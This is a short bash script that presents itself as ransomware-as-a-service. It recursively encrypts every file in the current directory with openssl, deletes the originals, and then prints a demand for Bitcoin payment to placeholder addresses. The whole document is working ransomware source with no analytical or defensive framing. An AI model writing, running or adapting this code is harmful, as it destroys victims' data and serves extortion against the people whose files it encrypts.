#!/bin/bash

# Function to encrypt files
encrypt_files() {
    for file in $(find "$1" -type f ! -name "*.sh" ! -name "*.zip"); do
        openssl enc -aes-256-cbc -in "$file" -out "${file}.enc"
        rm "$file"
    done
}

# Function to display ransomware message
display_message() {
    echo "Your files have been encrypted!"
    echo "Send 0.1 BTC to this address: 1BTCAddressHere"
    echo "Or pay the full fee of 1 BTC and receive a decryption key."
    echo ""
    echo "Decryption key will be sent here:"
    echo "1DecrypterKeyAddressHere"
}

# Main
echo "Welcome to RaaS!"
echo "Do you want to encrypt all files in this directory? (y/n)"
read choice

if [ "$choice" = "y" ]; then
    encrypt_files "."
    display_message
fi
